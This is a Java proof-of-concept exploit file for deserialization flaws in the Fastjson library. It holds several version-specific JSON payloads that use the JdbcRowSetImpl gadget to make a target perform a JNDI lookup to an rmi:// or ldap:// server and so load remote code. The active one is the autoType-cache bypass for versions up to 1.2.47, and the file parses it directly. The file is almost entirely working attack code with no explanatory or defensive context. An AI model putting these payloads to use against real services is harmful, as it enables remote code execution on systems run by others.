package org.dili.fastjson;

import com.alibaba.fastjson.JSON;

public class FastJsonPoc {
    public static void main(String[] args) {

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // 1.2.25-1.2.41
        //String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/tre2da\", \"autoCommit\":true}";

        // 1.2.42
        //String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/tre2da\", \"autoCommit\":true}";

        // 1.2.43
        // String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/tre2da\", \"autoCommit\":true}";

        // 1.2.25-1.2.47
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/tre2da\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}
